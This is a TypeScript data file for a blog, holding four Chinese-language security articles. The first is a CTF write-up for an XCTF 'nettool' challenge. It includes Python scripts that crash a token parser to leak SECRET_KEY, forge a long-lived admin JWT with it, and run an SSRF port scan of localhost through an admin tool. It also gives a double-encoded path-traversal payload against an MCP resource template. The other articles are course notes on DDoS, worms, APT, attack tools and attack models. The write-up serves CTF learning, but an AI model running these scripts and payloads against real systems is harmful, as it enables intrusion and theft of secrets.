export interface Article {
  id: number;
  title: string;
  date: string;
  author: string;
  summary: string;
  contentSections: { title: string; text: string; code?: string }[];
  tags: string[];
}

const articlesData: Article[] = [
  {
    "id": 1,
    "title": "nettool",
    "date": "2026-04-19",
    "author": "XXX",
    "summary": "本题涉及一个 pythonWeb 应用，具有“管理员网络工具（Admin NetTools）”功能。通过对该功能的深度挖掘，我们发现了隐藏的内网服务，并利用前沿的 MCP（Model Context Protocol） 协议漏洞最终获取了 Flag。",
    "contentSections": [
      {
        "title": "1. 题目背景",
        "text": "1. 题目背景\n\n本题涉及一个 pythonWeb 应用，具有“管理员网络工具（Admin NetTools）”功能。通过对该功能的深度挖掘，我们发现了隐藏的内网服务，并利用前沿的 MCP（Model Context Protocol） 协议漏洞最终获取了 Flag。"
      },
      {
        "title": "2. 漏洞复盘与解题步骤",
        "text": "2. 漏洞复盘与解题步骤\n\n第一阶段：信息泄露与权限提升\n\n访问目标 Web 应用时发现 guest/dashboard 接口。通过构造一个长度超过 2048 字节且含有非法字符（如 !!!）的 access_token Cookie 提交请求，导致后端 base64.b64decode 处理异常。\n\n现象：触发了 Django/FastAPI 的 Debug 模式，输出了详细的 Traceback。\n\n通过构造超长且非法的 access_token 触发服务端 500 错误，利用 Traceback 泄露了关键配置。\n\n漏洞点：security.py 中的 verify_token 函数逻辑缺陷。\n\n关键发现：泄露了 SECRET_KEY = \"RDbiBrgdR#CrdZVW\"。\n\n利用：使用该 Key 伪造 admin 权限的永久 JWT Token\n\n成功登录到admin nettool\n\n2.1 核心组件解析：什么是 Admin NetTool？\n\nAdmin NetTool 是本题的关键转折点。它是一个设计用于管理员进行网络调试的 Web 界面，通常具备发送 HTTP 请求、Ping 或 DNS 查询的功能。本题中只适用http/https协议\n\n漏洞本质：该工具未对目标地址进行严格过滤，构成了典型的 SSRF（服务端请求伪造） 漏洞。\n\n本题角色：由于目标机器的 5000 端口和 9000 端口仅监听在 127.0.0.1（回环地址），外部无法直接访问。我们必须将 admin/nettools 作为代理，利用服务器的身份去访问这些内网服务。\n\n第二阶段：JWT 权限提升与内网扫描\n\n利用 admin/nettools 提供的 SSRF 漏洞，运行自动化扫描脚本 attck.py。\n\n扫描结果：发现内网两个关键服务：\n\noPort 5000: Uvicorn 服务（静态文件/API）。\n\noPort 9000: Uvicorn 服务（后续证实为 MCP 服务器）。\n\n第三阶段：MCP 协议探索与路径发现\n\n对 9000 端口进行交互，识别其为 MCP 服务，针对 9000 端口发送 MCP 协议请求。MCP 是一种基于 JSON-RPC 的协议，用于 AI 模型与外部工具的交互。\n\n获取会话：通过 POST 请求触发 406 错误，从 Header 中提取 mcp-session-id\n\n由欢迎页知方向正确\n\n获取线索：调用 prompts/list 发现 where_is_flag 提示词。\n\n确定路径：调用 prompts/get 获取 Flag 的绝对路径：/root/1ffflllaaaggg。\n\n第四阶段：利用资源模板漏洞夺旗\n\n在 MCP 协议的内省中发现高危资源模板。\n\n发现模板：调用 resources/templates/list 发现 base64://tmp/{filename} 模板。\n\n路径穿越绕过：尝试直接读取失败后，使用 双重 URL 编码 构造路径穿越 Payload。\n\noPayload: base64://tmp/%252e%252e%252f%252e%252e%252f%252e%252e%252froot%252f1ffflllaaaggg\n\n获取 Flag：服务器成功返回文件的 Base64 编码内容。"
      },
      {
        "title": "3. Flag 提交",
        "text": "3. Flag 提交\n\nBase64 字符串：ZmxhZ3tuakMxd3EwWmdIR2RRNWFNSVRObmswY3ZOQzkwbXJDa30K\n\n解码结果：flag{njC1wq0ZgHGdQ5aMITNnk0cvNC90mrCk}"
      },
      {
        "title": "4. 知识补充解释",
        "text": "4. 知识补充解释\n\n什么是 MCP？  MCP 是 Anthropic 等公司推出的开放标准，旨在让 AI 模型安全地访问本地数据和工具。资源模板允许服务器动态暴露文件。本题模拟了 MCP 服务配置不当导致的敏感文件泄露，由于未对模板参数 {filename} 进行 ../ 检查，导致了目录穿越漏洞。\n\n为什么使用双重编码？ 有些 Web 服务器或中间件（如 uvicorn/nginx）会自动解码一次 %2e。如果后端代码在逻辑中又执行了一次解码，双重编码（%252e）就能绕过第一层的路径检查逻辑。\n\nJWT 攻击原理：JWT 的安全性全靠 SECRET_KEY。一旦泄露，攻击者可以签发任何角色的 Token。"
      },
      {
        "title": "Crash.py",
        "text": "5 .  攻击源码附上\n\nCrash.py",
        "code": "Plain Text\nPython\nimport httpx\n\n# 目标 URL\nTARGET_URL = \"http://web-ed1e31d95d.challenge.xctf.org.cn/guest/dashboard\"\n\n# 构造必杀 Payload\n# 1. 有效字符 'a' * 2045\n# 2. 无效字符 '!' * 3\n# 3. 填充字符 'b' * 100 (确保总长 > 2048)\n# -------------------------------------------------\n# 逻辑分析：\n# token[:2048] 将是 \"a...a\" (2045个) + \"!!!\" (3个)\n# b64decode 处理时丢弃 \"!!!\"\n# 剩余长度 2045。2045 % 4 != 0。--> 必定崩溃！\n# -------------------------------------------------\ncrash_payload = \"Bearer \" + \"a\" * 2045 + \"!!!\" + \"b\" * 100\n\nprint(f\"[*] 发送精准崩溃 Payload (长度: {len(crash_payload) - 7})...\")\n\ntry:\n    r = httpx.get(\n        TARGET_URL, \n        cookies={\"access_token\": crash_payload},\n        verify=False\n    )\n    \n    print(f\"[*] 状态码: {r.status_code}\")\n    \n    if r.status_code == 500:\n        print(\"\\n[+] ！！！成功触发 500 报错！！！\")\n        print(\"=\" * 20 + \" TRACEBACK START \" + \"=\" * 20)\n        # 打印完整的报错信息，重点寻找 settings.SECRET_KEY 或路径信息\n        print(r.text) \n        print(\"=\" * 20 + \" TRACEBACK END \" + \"=\" * 20)\n    else:\n        print(f\"[-] 依然没有触发 500 (返回 {r.status_code})。\")\n        print(\"[-] 响应片段:\", r.text[:200])\n\nexcept Exception as e:\n    print(f\"[!] 请求失败: {e}\")"
      },
      {
        "title": "FakeToken.py",
        "text": "FakeToken.py",
        "code": "Plain Text\nPython\nimport jwt\nimport datetime\n\n# 填入你从 Traceback 里看到的真实 Key\nREAL_SECRET_KEY = \"RDbiBrgdR#CrdZVW\" \n\npayload = {\n    \"sub\": \"admin\",\n    \"exp\": datetime.datetime.utcnow() + datetime.timedelta(days=36500) # 100年后过期\n}\ntoken = jwt.encode(payload, REAL_SECRET_KEY, algorithm=\"HS256\")\nprint(f\"永久 Token: {token}\")"
      },
      {
        "title": "AttackPort.py",
        "text": "AttackPort.py",
        "code": "Plain Text\nPython\nimport httpx\nimport threading\nimport queue\nimport time\nimport sys\nimport re\n\n# ================= 配置区 =================\n# 1. 靶机地址\nBASE_URL = \"http://web-ed1e31d95d.challenge.xctf.org.cn\" \n\n# 2. 登录凭证 (用于 Token 失效时自动重新登录)\nUSERNAME = \"admin\"\n# [!] 请填入你之前爆破出来的密码，或者是 config.py 里的 \"[REDACTED]\"\nPASSWORD = \"admin\" \n\n# 3. 初始 Cookie (可选，如果为空脚本会自动先登录一次)\n# 如果你不想填密码，必须保证这个 Token 有效期够长\nCURRENT_TOKEN = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6NDkxOTg2NDQ3NH0.ZGgHDU-j2tIYNypO_GvsbR_bdkSWyU4jzRNAJg0enfo\" \n\n# 4. 扫描配置\nINTERNAL_TARGET = \"127.0.0.1\"\nTHREAD_COUNT = 50\nTOTAL_PORTS = 65535\n# =========================================\n\n# 全局变量\ntoken_lock = threading.Lock()\nprint_lock = threading.Lock()\nq = queue.Queue()\nprocessed_count = 0\n\n# 填充任务\nfor p in range(1, TOTAL_PORTS + 1):\n    q.put(p)\n\ndef get_new_token():\n    \"\"\"执行登录并获取新 Token\"\"\"\n    global CURRENT_TOKEN\n    login_url = f\"{BASE_URL}/login\"\n    try:\n        # 模拟登录表单\n        r = httpx.post(login_url, data={\"username\": USERNAME, \"password\": PASSWORD}, follow_redirects=False, timeout=10)\n        \n        # 检查 Cookie\n        if \"access_token\" in r.cookies:\n            token = r.cookies[\"access_token\"]\n            # 去掉可能的 Bearer 前缀存储，使用时再加\n            if token.startswith(\"Bearer \"):\n                token = token.split(\" \")[1] # 这里的处理取决于服务端 set-cookie 的格式，通常 cookie 值里只有乱码\n            \n            # 有些时候 set-cookie 是形如 \"access_token=Bearer%20...\" 的\n            # 简单粗暴点，直接拿值\n            raw_token = r.cookies.get(\"access_token\")\n            # 如果包含 Bearer%20 或者 Bearer+，清洗一下\n            if \"Bearer\" in raw_token:\n                import urllib.parse\n                decoded = urllib.parse.unquote(raw_token)\n                if \"Bearer \" in decoded:\n                    raw_token = decoded.split(\"Bearer \")[1]\n            \n            with print_lock:\n                print(f\"\\n[+] Token 已自动续期!\")\n            return raw_token\n        else:\n            with print_lock:\n                print(f\"\\n[!] 自动登录失败: 未获取到 Cookie。状态码: {r.status_code}\")\n            return None\n    except Exception as e:\n        with print_lock:\n            print(f\"\\n[!] 自动登录异常: {e}\")\n        return None\n\ndef check_token_validity():\n    \"\"\"初始化检查：如果没有 Token，先登录\"\"\"\n    global CURRENT_TOKEN\n    if not CURRENT_TOKEN:\n        print(\"[*] 初始 Token 为空，正在执行首次登录...\")\n        new_token = get_new_token()\n        if new_token:\n            CURRENT_TOKEN = new_token\n            print(f\"[+] 登录成功。\")\n        else:\n            print(\"[-] 登录失败，请检查账号密码。程序退出。\")\n            sys.exit(1)\n\ndef scan_worker():\n    global processed_count, CURRENT_TOKEN\n    \n    while not q.empty():\n        try:\n            port = q.get(timeout=1)\n        except:\n            break\n\n        target_url = f\"http://{INTERNAL_TARGET}:{port}/\"\n        retry_count = 0\n        \n        while retry_count < 3:\n            # 构造请求\n            # 注意：CURRENT_TOKEN 可能被其他线程更新，所以这里直接读全局变量\n            auth_header = f\"Bearer {CURRENT_TOKEN}\"\n            if \"Bearer\" in CURRENT_TOKEN: # 防止重复\n                auth_header = CURRENT_TOKEN\n            else:\n                auth_header = f\"Bearer {CURRENT_TOKEN}\"\n\n            headers = {\n                \"Cookie\": f\"access_token={auth_header}\", # 修正 Cookie 格式\n                \"User-Agent\": \"Admin-Scanner-Bot/1.0\"\n            }\n            \n            data = {\n                \"http_method\": \"GET\",\n                \"http_url\": target_url,\n                \"http_headers\": \"{}\",\n                \"http_body\": \"\"\n            }\n            \n            try:\n                # 发包\n                r = httpx.post(f\"{BASE_URL}/admin/nettools\", headers=headers, data=data, timeout=5, verify=False)\n                \n                # === 核心逻辑：检测 Token 是否失效 ===\n                if r.status_code == 401: # 或者 302 跳转回 login\n                    with token_lock:\n                        # 双重检查：可能别的线程已经更新了 Token\n                        # 我们简单点，只要是 401 就尝试刷新，反正有 lock\n                        with print_lock:\n                            print(f\"\\n[!] 线程发现 Token 失效 (401)，正在尝试重连...\")\n                        \n                        new_token = get_new_token()\n                        if new_token:\n                            CURRENT_TOKEN = new_token\n                            retry_count += 1\n                            continue # 拿到新 Token 后，重试当前端口\n                        else:\n                            break # 登录都失败了，放弃这个端口\n                \n                # === 正常逻辑：检测内网端口 ===\n                # 只要不是 401，说明我们成功访问到了 Admin NetTool 接口\n                # 接下来检查 NetTool 返回的 HTML 内容里有没有 \"Status:\"\n                \n                if \"Status:\" in r.text:\n                    # 进一步指纹识别\n                    server_header = \"Unknown\"\n                    title = \"Unknown\"\n                    match_server = re.search(r\"server: (.*)\", r.text, re.IGNORECASE)\n                    if match_server: server_header = match_server.group(1).strip()\n                    match_title = re.search(r\"<title>(.*?)</title>\", r.text, re.IGNORECASE)\n                    if match_title: title = match_title.group(1).strip()\n\n                    with print_lock:\n                        print(f\"\\n[+] 发现端口: {port} | Server: {server_header}\")\n                        # 特别高亮 Python SimpleHTTP\n                        if \"SimpleHTTP\" in server_header or \"Directory listing\" in title:\n                            print(f\"    [★] ！！！找到目标！！！ -> http://{INTERNAL_TARGET}:{port}/\")\n                            # 将结果写入文件以防刷屏错过\n                            with open(\"found_ports.txt\", \"a\") as f:\n                                f.write(f\"Port {port}: {server_header} | {title}\\n\")\n                    \n                break # 请求成功（或内网不通），跳出重试循环\n                \n            except Exception:\n                break # 网络错误，跳过\n        \n        # 更新进度\n        with print_lock:\n            processed_count += 1\n            if processed_count % 500 == 0 or processed_count == TOTAL_PORTS:\n                percentage = (processed_count / TOTAL_PORTS) * 100\n                sys.stdout.write(f\"\\r[*] 扫描进度: {processed_count}/{TOTAL_PORTS} ({percentage:.2f}%) - 当前端口: {port}\")\n                sys.stdout.flush()\n        \n        q.task_done()\n\n# ================= 主程序 =================\nif __name__ == \"__main__\":\n    check_token_validity()\n    \n    print(f\"[*] 开始扫描 {INTERNAL_TARGET} (1-65535)...\")\n    print(f\"[*] 自动保活模式已开启。\")\n    \n    threads = []\n    for _ in range(THREAD_COUNT):\n        t = threading.Thread(target=scan_worker)\n        t.daemon = True\n        t.start()\n        threads.append(t)\n\n    q.join()\n    print(\"\\n\\n[*] 扫描结束。请检查上方输出或 found_ports.txt\")"
      },
      {
        "title": "Appendix",
        "text": "可运行环境\n\nPlain Text\npython（位于最高级目录中）\napp\\.app\\Scripts\\python.exe -m app.main\n\n[app.zip]\n\n题目给出的源码↓↓↓↓↓\n\n[nettool.zip]"
      }
    ],
    "tags": [
      "CTF",
      "Web-Security",
      "SSRF",
      "MCP",
      "JWT"
    ]
  },
  {
    "id": 2,
    "title": "网络攻击案例分析",
    "date": "2026-04-18",
    "author": "XXX",
    "summary": "DDoS（Distributed Denial of Service）：利用大量被控制的“肉鸡”（僵尸主机）协同发起攻击，攻击强度呈指数级增长。",
    "contentSections": [
      {
        "title": "分布式拒绝服务攻击（DDoS）",
        "text": "分布式拒绝服务攻击（DDoS）\n\n什么是 DDoS？\n\nDOS（Denial of Service）：单台主机发起攻击，使目标服务不可用。\n\nDDoS（Distributed Denial of Service）：利用大量被控制的“肉鸡”（僵尸主机）协同发起攻击，攻击强度呈指数级增长。\n\nDDoS 攻击的五个步骤\n\n探测目标：扫描互联网或局域网，寻找存在安全漏洞的主机。\n\n获取控制权：利用漏洞植入木马（如远控程序），获得主机控制权限。\n\n部署攻击程序：在被控主机上安装 DDoS 客户端（攻击载荷）。\n\n横向扩展：以已控制主机为跳板，继续扫描和感染更多主机，扩大僵尸网络（Botnet）。\n\n发起攻击：主控端统一发送指令，所有肉鸡同时向目标发起洪水式请求，导致服务瘫痪。\n\n💡 核心逻辑：人多力量大，攻击规模越大，破坏力越强。\n\n常见 DDoS 攻击技术\n\n攻击类型\n\n原理说明\n\n协议/特点\n\nHTTP Flood\n\n利用僵尸网络向目标网站发送大量 HTTP GET/POST 请求，耗尽 Web 服务器资源。\n\n应用层攻击，模拟真实用户\n\nSYN Flood\n\n伪造大量 SYN 报文发起 TCP 三次握手，服务器为每个请求分配内存但无法完成连接，最终资源耗尽。\n\n利用 TCP 协议缺陷，伪造源 IP\n\nDNS 放大攻击\n\n伪造目标 IP 向开放 DNS 服务器发送大量请求，诱使其返回大体积响应，流量被放大数十倍回传至目标。\n\n基于 UDP，带宽耗尽型攻击\n\n⚠️ 防御提示：部署流量清洗、CDN、速率限制、SYN Cookie 等机制可缓解 DDoS。"
      },
      {
        "title": "蠕虫病毒案例：W32.Blaster.Worm",
        "text": "蠕虫病毒案例：W32.Blaster.Worm\n\n2.1 蠕虫识别特征\n\n命名规则：病毒名称中包含 “worm”（如 Blaster.Worm），即为蠕虫。\n\n与木马/病毒区别：\n\no病毒：需宿主文件传播；\n\no木马：伪装正常程序，依赖用户执行；\n\no蠕虫：可自我复制、自动传播，无需人为干预。\n\n2.2 Blaster 蠕虫攻击过程\n\n初始感染：用户主机因未打补丁（MS03-026）被远程利用。\n\n漏洞利用：通过 TCP 135 端口（RPC 服务）发起攻击。\n\n自动传播：感染主机主动扫描局域网内其他 135 端口开放的机器。\n\n下载执行：从远程服务器下载蠕虫副本并运行，形成链式感染。\n\n附加破坏：进行拒绝服务，阻止 Windows Update，使用户无法修复漏洞。\n\n📌 典型症状：系统频繁重启、网络异常、无法更新系统。\n\n2.3 防御措施\n\n打补丁：及时安装微软安全更新（如 MS03-026）。\n\n封端口：在防火墙/ACL 中关闭 135、139、445 等高危端口。\n\n部署安全设备：入侵检测系统（IDS）、防病毒网关、终端防护软件。\n\n网络隔离：划分 VLAN，限制横向移动。\n\n✅ 关键原则：“堵漏洞 + 断传播” 是遏制蠕虫的核心。"
      },
      {
        "title": "高级持续性威胁（APT）攻击案例：乌克兰电力系统攻击",
        "text": "高级持续性威胁（APT）攻击案例：乌克兰电力系统攻击\n\n攻击事件回顾（2015 年乌克兰大停电）\n\n这是全球首例因网络攻击导致的大规模停电事件，具有典型 APT 特征。\n\n攻击步骤分解\n\n1.初始入侵：\n\no黑客发送钓鱼邮件，诱导电力公司员工打开含木马的附件（如 Word 文档）。\n\n2.建立据点：\n\no木马激活后，黑客获得员工办公电脑控制权，作为跳板。\n\n3.横向渗透：\n\no利用内网漏洞，逐步渗透至电力主控系统服务器。\n\n4.部署后门与破坏工具：\n\n安装 SSH 后门维持访问；\n\n部署 KillDisk 系统自毁工具，擦除硬盘数据，破坏系统恢复能力。\n\n5.执行断电操作：\n\no远程操控 SCADA 系统，切断变电站与主控中心连接，造成大面积停电。\n\n6.干扰应急响应：\n\no同时对电力客服中心发起 DDoS 攻击，使民众无法报修，加剧混乱。\n\n🌐 攻击效果：23 万用户断电数小时，社会秩序严重受损。"
      },
      {
        "title": "什么是 APT 攻击？",
        "text": "什么是 APT 攻击？\n\nAPT（Advanced Persistent Threat）：高级持续性威胁，通常由国家级黑客组织发起。\n\n三大核心特征：\n\n特征\n\n说明\n\n高级（Advanced）\n\n使用多种攻击手段（钓鱼、0day 漏洞、定制木马、横向移动等），技术复杂。\n\n持续（Persistent）\n\n攻击周期长（数月甚至数年），持续潜伏、监控、提权，不急于暴露。\n\n威胁（Threat）\n\n目标明确（关键基础设施、政府、军工、能源等），危害国家安全与社会稳定。\n\n📚 经典案例：\n\n乌克兰电力攻击（2015）\n\n伊朗“震网”病毒（Stuxnet，2010）\n\n“海莲花”（OceanLotus）针对中国海事机构的长期渗透"
      },
      {
        "title": "APT 防御策略（案例题答题要点）",
        "text": "APT 防御策略（案例题答题要点）\n\nAPT 无法靠单一设备防御，需构建纵深防御体系：\n\n技术层面\n\no部署 EDR（终端检测与响应）、沙箱分析、网络流量分析（NTA）\n\no启用 多因素认证（MFA），限制特权账户使用\n\no实施 网络微隔离，阻断横向移动路径\n\n管理层面\n\no定期开展 安全意识培训（防范钓鱼邮件）\n\no建立 漏洞管理机制，及时打补丁\n\no执行 最小权限原则 和 定期备份\n\n监测与响应\n\no构建 安全态势感知平台，实现全网日志关联分析\n\no制定 应急响应预案，定期演练\n\no与国家级 CERT 机构联动，共享威胁情报\n\n✍️ 答题模板（如考题问“如何防范 APT？”）：\n“APT 攻击具有高级性、持续性和高威胁性，需采取综合防御措施：一是加强终端与网络层监测（如部署 EDR、沙箱）；二是强化人员安全意识与访问控制；三是建立常态化漏洞管理和应急响应机制，实现‘监测-预警-处置-恢复’闭环。”"
      },
      {
        "title": "总结与考点提示",
        "text": "总结与考点提示\n\n攻击类型\n\n关键识别点\n\n防御核心\n\n考试重点\n\nDDoS\n\n大量请求、服务瘫痪、僵尸网络\n\n流量清洗、限速、CDN\n\n三种攻击原理（HTTP/SYN/DNS）\n\n蠕虫\n\n自我复制、自动传播、名称含“worm”\n\n打补丁 + 封端口\n\nBlaster 利用 135 端口，阻断传播链\n\nAPT\n\n多阶段、长期潜伏、目标明确\n\n纵深防御 + 态势感知\n\n三大特征 + 防范措施（综合答题）"
      },
      {
        "title": "🔔 重要提醒：",
        "text": "🔔 重要提醒：\n\n案例分析题常要求“结合实例说明攻击过程及防御措施”。\n\n务必掌握 DDoS 三类攻击原理、蠕虫传播机制、APT 三大特征。\n\n回答防御类问题时，避免只写“装防火墙”，应体q现“技术+管理+流程”多维度思路。"
      }
    ],
    "tags": [
      "Attack-Case",
      "DDoS",
      "Worm",
      "APT",
      "Defense"
    ]
  },
  {
    "id": 3,
    "title": "黑客常用工具分析",
    "date": "2026-04-17",
    "author": "XXX",
    "summary": "扫描器是黑客进行信息收集阶段最基础、最重要的工具之一。通过扫描器，攻击者可以快速识别目标网络中的活跃主机、开放端口以及潜在的软件漏洞。",
    "contentSections": [
      {
        "title": "扫描器（Scanners）",
        "text": "扫描器（Scanners）\n\n扫描器是黑客进行信息收集阶段最基础、最重要的工具之一。通过扫描器，攻击者可以快速识别目标网络中的活跃主机、开放端口以及潜在的软件漏洞。\n\n地址扫描器（Host Discovery）\n\n功能：探测指定网段（如 192.168.1.0/24）中哪些 IP 地址处于活跃状态（即主机已开机并联网）。\n\n用途：缩小攻击范围，确定潜在目标。\n\n示例场景：扫描出某局域网中有 150 台活跃主机，作为后续攻击的候选目标。\n\n端口扫描器（Port Scanning）\n\n功能：探测活跃主机上开放的端口，判断其运行的服务（如 HTTP 80、SSH 22、RDP 3389 等）。\n\n典型工具：Nmap（Network Mapper）\n\n支持主机发现、端口扫描、服务版本识别、操作系统探测等。\n\n命令示例：nmap -sS -A 192.168.1.1\n\n漏洞扫描器（Vulnerability Scanning）\n\n功能：检测目标系统或服务中已知的安全漏洞（如未打补丁的软件、配置错误等）。\n\n典型工具：\n\nNessus：功能强大，广泛用于企业级漏洞评估（早期免费，现为商业软件）。\n\nSuperScan（历史工具）：可进行主机发现、端口扫描及简单漏洞检测，现已淘汰。\n\n注意：Nmap 虽以端口扫描为主，但配合脚本（NSE）也可实现部分漏洞探测。"
      },
      {
        "title": "远程控制与监控工具（Remote Access / Trojan）",
        "text": "远程控制与监控工具（Remote Access / Trojan）\n\n黑客常通过植入远程控制程序，将受害主机变为“肉鸡”（Bot），用于后续攻击或长期监控。\n\n常见工具（历史与典型）：\n\n冰河（Gh0st RAT）：国产远程控制木马，曾广泛用于内网渗透。\n\n灰鸽子（Huigezi）：功能强大的远程管理工具，易被滥用于非法控制。\n\nNetcat（nc）：轻量级网络工具，可建立反向 Shell，实现远程命令执行。\n\n用途：\n\n窃取数据\n\n持久化控制\n\n作为跳板机或 DDoS 攻击源（如发起分布式拒绝服务攻击）\n\n⚠️ 注：此类工具本身为中性技术，合法用于系统维护，非法用于攻击则构成犯罪。"
      },
      {
        "title": "密码破解（Password Cracking）",
        "text": "密码破解（Password Cracking）\n\n密码破解是获取系统访问权限的关键手段，主要针对弱口令或配置不当的认证系统。\n\n主要方式：\n\n弱口令猜测（Dictionary Attack）\n\n使用常见用户名/密码组合（如 admin/123456）进行尝试。\n\n穷举攻击（Brute Force）\n\n系统性地尝试所有可能的字符组合，依赖高性能计算资源。\n\n撞库攻击（Credential Stuffing）\n\n利用从其他平台泄露的用户名密码数据库，在目标系统中批量尝试登录。\n\n与穷举不同：撞库基于已有真实凭据，成功率更高。\n\n常见工具：\n\nLinux 下：John the Ripper、Hashcat\n\nWindows 下：Cain & Abel、Ophcrack\n\n（注：具体工具名称可根据教学需要补充）"
      },
      {
        "title": "网络嗅探器（Network Sniffers）",
        "text": "网络嗅探器（Network Sniffers）\n\n用于捕获和分析网络中传输的数据包，可能从中提取敏感信息（如明文传输的账号密码）。\n\n典型工具：\n\nWireshark（当前主流）\n\n开源、免费、图形化界面强大。\n\n支持协议解析、流量过滤、会话重建。\n\n可捕获 HTTP、FTP、Telnet 等明文协议中的用户名和密码。\n\nSniffer Pro（历史工具）\n\n早期商业嗅探软件，现已基本淘汰。\n\n🔒 安全建议：敏感数据应使用 HTTPS、SSH 等加密协议传输，防止被嗅探。"
      },
      {
        "title": "综合安全渗透工具箱",
        "text": "综合安全渗透工具箱\n\n为提高效率，黑客和安全研究人员常使用集成化渗透测试平台。\n\n典型代表：Kali Linux\n\n前身：BackTrack（BT5 为其最后一个版本）\n\n现状：Kali Linux 是 BT5 的官方继任者，由 Offensive Security 维护。\n\n特点：\n\n基于 Debian 的专用安全发行版。\n\n预装 600+ 安全工具，涵盖：\n\n信息收集（如 Nmap、Recon-ng）\n\n漏洞扫描（如 Nessus、OpenVAS）\n\n密码攻击（如 Hydra、Hashcat）\n\n无线攻击、逆向工程、压力测试等\n\n支持渗透测试全流程：信息收集 → 漏洞评估 → 利用 → 权限提升 → 维持访问\n\n📌 教材说明：部分教材（如 2020 年编写）仍提及 BT5，实为知识滞后。当前行业标准为 Kali Linux，建议教学中以 Kali 为准。"
      },
      {
        "title": "总结：工具无善恶，关键在使用者",
        "text": "总结：工具无善恶，关键在使用者\n\n工具类别\n\n代表工具\n\n主要用途\n\n扫描器\n\nNmap, Nessus\n\n发现主机、端口、漏洞\n\n远程控制\n\n冰河, Netcat\n\n植入后门、远程操控\n\n密码破解\n\nHashcat, John\n\n破解弱口令、获取凭证\n\n网络嗅探\n\nWireshark\n\n抓包分析、窃取明文数据\n\n综合平台\n\nKali Linux\n\n一体化渗透测试环境\n\n✅ 合法用途：红队演练、漏洞评估、安全加固\n\n❌ 非法用途：未经授权的入侵、数据窃取、破坏系统\n\n课件说明：本节内容适用于网络安全入门教学，强调技术原理与防御意识，严禁用于非法活动。\n\n更新建议：教材中若仍使用 BT5 等过时工具，请统一替换为 Kali Linux 等现代标准平台。"
      }
    ],
    "tags": [
      "Security-Tools",
      "Kali",
      "Scanning",
      "Sniffing",
      "Password-Cracking"
    ]
  },
  {
    "id": 4,
    "title": "网络攻击模型 - 攻击树模型",
    "date": "2026-04-16",
    "author": "7h1n9",
    "summary": "攻击树模型：起源于故障树分析方法，经过扩展用AND-OR形式的树结构对目标对象进行网络安全威胁分析。可以被Red Team用来进行渗透测试，同时也可以被Blue Team用来研究防御机制。",
    "contentSections": [
      {
        "title": "网络攻击模型 - 攻击树模型",
        "text": "网络攻击模型 - 攻击树模型\n\n攻击树模型：起源于故障树分析方法，经过扩展用AND-OR形式的树结构对目标对象进行网络安全威胁分析。可以被Red Team用来进行渗透测试，同时也可以被Blue Team用来研究防御机制。\n\n优点：能够采取专家头脑风暴法，并且将这些意见融合到攻击树中去；能够进行费效分析或者概率分析；能够建模非常复杂的攻击场景。\n\n缺点：由于树结构的内在限制，攻击树不能用来建模多重常识攻击、时间依赖及访问控制等场景；不能用来建模循环事件；对于现实中的大规模网络，攻击树方法处理起来将会特别复杂。"
      },
      {
        "title": "网络攻击模型 - MITRE ATT&CK模型",
        "text": "网络攻击模型 - MITRE ATT&CK模型\n\nMITRE ATT&CK模型（常用）：根据真实观察到的网络攻击数据提炼形成的攻击矩阵模型；该模型把攻击活动抽象为初始访问、执行、持久化、特权提升、躲避防御、凭据访问、发现、横向移动、收集、指挥和控制、外泄、影响，然后给出攻击活动的具体实现方式。主要应用场景有网络红蓝对抗模拟、网络安全渗透测试、网络防御差距评估、网络威胁情报收集等。\n\n网络杀伤链（Kill Chain）模型：将网络攻击活动分成目标侦察、武器构造、载荷投送、漏洞利用、安装植入、指挥和控制、目标行动等七个阶段。 【七伤剑】"
      },
      {
        "title": "网络攻击发展趋势",
        "text": "网络攻击发展趋势\n\n网络攻击攻击智能化、自动化\n\n网络攻击者群体普适化\n\n网络攻击目标多样化和隐蔽性\n\n网络攻击计算资源获取方便（DDOS/利用云计算进行口令破解）\n\n网络攻击活动持续化强（APT攻击）\n\n网络攻击速度加快\n\n网络攻击影响扩大\n\n网络攻击主体组织化"
      },
      {
        "title": "网络攻击一般过程（8步曲）",
        "text": "网络攻击一般过程（8步曲）\n\n步骤\n\n内容\n\n(1) 隐藏攻击源\n\n利用被侵入的主机作为跳板；使用免费代理网关；伪造IP地址；假冒用户账号。\n\n(2) 收集攻击目标信息\n\n收集目标系统的一般信息、配置信息、安全漏洞信息、安全措施信息、用户信息等。\n\n(3) 挖掘漏洞信息\n\n系统或应用服务软件漏洞；主机信任关系漏洞；目标网络的使用者漏洞；通信协议漏洞；网络业务系统漏洞。\n\n(4) 获取目标访问权限\n\n获得系统管理员的口令；利用系统管理上的漏洞；诱导系统管理员运行特洛伊木马；窃听管理员口令。\n\n(5) 隐蔽攻击行为\n\n连接隐藏；进程隐藏；文件隐蔽。\n\n(6) 实施攻击\n\n攻击其他被信任的主机和网络；修改或删除重要数据；窃听敏感数据；停止网络服务；下载敏感数据；删除数据账号；修改数据记录。\n\n(7) 开辟后门\n\n放宽文件许可权；重新开放不安全的服务；修改系统配置；替换系统共享库文件；修改系统源代码，安装特洛伊木马；安装嗅探器；建立隐蔽信道。\n\n(8) 清除攻击痕迹\n\n篡改日志文件中的审计信息；改变系统时间以扰乱日志数据；删除或停止审计服务进程；干扰入侵检测系统的正常运行；修改完整性检测标签。"
      }
    ],
    "tags": [
      "Attack-Model",
      "ATTACK",
      "Kill-Chain",
      "Trend"
    ]
  }
];

export function getArticles(): Article[] {
  return articlesData;
}

export function getArticleById(id: number): Article | undefined {
  return articlesData.find((article) => article.id === id);
}
